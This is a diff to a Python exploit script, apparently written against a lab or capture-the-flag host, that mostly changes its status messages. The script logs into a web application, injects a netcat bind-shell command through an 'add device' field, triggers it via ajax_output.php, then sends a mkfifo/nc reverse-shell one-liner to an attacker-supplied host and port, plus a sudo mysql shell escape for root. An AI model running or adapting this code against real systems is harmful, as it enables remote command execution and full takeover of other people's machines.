@@ -236,10 +236,16 @@ def login(url,user_login,password,user_system,lport,lhost):
         "submit":""
     }
     response = session.post(url_login,data_post)
+    login_check = url + "/device-groups/"
+    check = requests.get(login_check)
+    if check.status_code == 200:
+        print("[+]Successful login")
+    else:
+        print("[-]Error login")
     return session
 
 def user_cronos(url,lport,lhost,session):
-    print("entre")
+    print("[+] Starting attack on cronos")
     cmd= "'$(nc -lvnp 4442 -e /bin/bash &) #"
     headers = {
         "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
@@ -272,7 +278,7 @@ def user_cronos(url,lport,lhost,session):
     try:
         response_addhost = session.post(url_addhost,data_urlencode,headers=headers,timeout=5).text
         if "Device added" in response_addhost:
-            print("found")
+            print("[+]Add device successful")
             data_exploit = {
                 "id":"capture",
                 "format":"text",
@@ -282,17 +288,16 @@ def user_cronos(url,lport,lhost,session):
             url_exploit = session.get(url=url+"/ajax_output.php",params=data_exploit,headers=headers,timeout=5)
             pass
         else:
-            "Not found"
+            print("[-] Add device error")
     except:
         pass
     ########################################################################################################
     command_two="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f\n"%(lhost,lport)
-    print(command_two)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.56.14", 4442))  # Cambia la dirección y el puerto según tus necesidades
     s.send(command_two.encode())
-    
 def user_root(url,lport,lhost,session):
+    print("[+] Starting attack on root")
     cmd= "'$(nc -lvnp 4441 -e /bin/bash &) #"
     headers = {
         "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
@@ -325,7 +330,7 @@ def user_root(url,lport,lhost,session):
     try:
         response_addhost = session.post(url_addhost,data_urlencode,headers=headers,timeout=5).text
         if "Device added" in response_addhost:
-            print("found")
+            print("[+]Add device successful")
             data_exploit = {
                 "id":"capture",
                 "format":"text",
@@ -335,22 +340,16 @@ def user_root(url,lport,lhost,session):
             url_exploit = session.get(url=url+"/ajax_output.php",params=data_exploit,headers=headers,timeout=5)
             pass
         else:
-            "Not found"
+            print("[-] Add device error")
     except:
         pass
     ########################################################################################################
     command=b"sudo mysql -e '\! /bin/sh'\n"
     command_two="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f\n"%(lhost,lport)
-    print(command_two)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.56.14", 4441))  # Cambia la dirección y el puerto según tus necesidades
     s.send(command)
     s.send(command_two.encode())
-
-
-
-
-
 if __name__ == "__main__":
     proxies = {"http":"http://127.0.0.1:8083"}
     url,user_login,password,user_system,lport,lhost = data()
@@ -359,9 +358,7 @@ if __name__ == "__main__":
         user_cronos(url,lport,lhost,session)
     else:
         pass
-
     if user_system == "root":
-        #user_cronos(url,lport,lhost,session)
         user_root(url,lport,lhost,session)
     else:
         pass
